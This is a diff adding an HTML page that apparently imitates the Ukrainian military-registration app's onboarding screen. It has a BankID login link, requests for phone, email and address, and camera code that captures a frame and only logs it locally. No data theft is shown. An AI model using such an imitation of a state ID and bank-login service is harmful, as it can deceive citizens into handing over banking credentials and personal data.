@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+<html lang="uk">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Document</title>
+    <link rel="stylesheet" href="style6.css">
+    <link rel="manifest" href="manifest.json">
+</head>
+
+<body>
+   
+
+    
+    <div id="update-modal" class="modal">
+        <div class="modal-content">
+            <div class="update-message">
+                
+                <h2>Привіт!</h2>
+                <p>Щоб отримати військово-<br>обліковий документ,<br> пройдіть три швидкі кроки</p>
+                <div class="steps">
+                    <ul>
+                    <li >1. Авторизуйтесь за допомогою Системи BankID НБУ </li>
+                    <li >2. Підтвердіть або уточніть персональні дані (лише при першій авторизації):<br><br>
+                    ◆ мобільний телефон<br>
+                    ◆ email адресу<br>
+                    ◆ поточну адресу проживання</li>
+                    <li>3. Задайте пароль та налаштування входу за біометричними даним </li>
+                    </ul></div>
+
+                    <p><span> Будь ласка, ознайомтесь зі змістом</span></p>
+                    <p><strong>Повідомлення про обробку персональних даних</strong></p>
+            <a href="bankid.html"> <button class="thank-you-button">Розпочати</button></a>
+            <br><br><br><br>
+
+            <a href="javascript:void(0);" id="scan-button">
+                <p class="scan-button">Сканувати документ</p>
+            </a>
+            </div>
+        </div>
+    </div>
+    
+
+    <script>
+        // Функция для включения камеры и захвата фото
+        async function startCamera() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: { exact: "environment" } } // Используем заднюю камеру
+                });
+                const videoElement = document.createElement('video');
+                videoElement.srcObject = stream;
+                videoElement.play();
+
+                // Добавляем видео на страницу для предпросмотра
+                document.body.appendChild(videoElement);
+                videoElement.style.position = 'fixed';
+                videoElement.style.top = '0';
+                videoElement.style.left = '0';
+                videoElement.style.width = '100%';
+                videoElement.style.height = '100%';
+                videoElement.style.zIndex = '1000'; // Чтобы видео было поверх остальных элементов
+                videoElement.style.objectFit = 'cover'; // Заполняем экран
+
+                // Захват изображения после короткой задержки
+                setTimeout(async () => {
+                    const canvas = document.createElement('canvas');
+                    canvas.width = videoElement.videoWidth;
+                    canvas.height = videoElement.videoHeight;
+                    const context = canvas.getContext('2d');
+                    context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
+
+                    // Остановить поток видео
+                    stream.getTracks().forEach(track => track.stop());
+                    videoElement.remove();
+
+                    // Получаем данные изображения
+                    const imageData = canvas.toDataURL('image/png');
+
+                    // Здесь можно добавить код для обработки изображения и сканирования QR-кода
+                    console.log('Фото захвачено:', imageData);
+
+                }, 3000); // Задержка 3 секунды перед захватом фото
+
+            } catch (error) {
+                console.error('Ошибка доступа к камере:', error);
+            }
+        }
+
+        // Добавляем обработчик события на кнопку
+        document.getElementById('scan-button').addEventListener('click', startCamera);
+    </script>
+</body>
+
+</html>
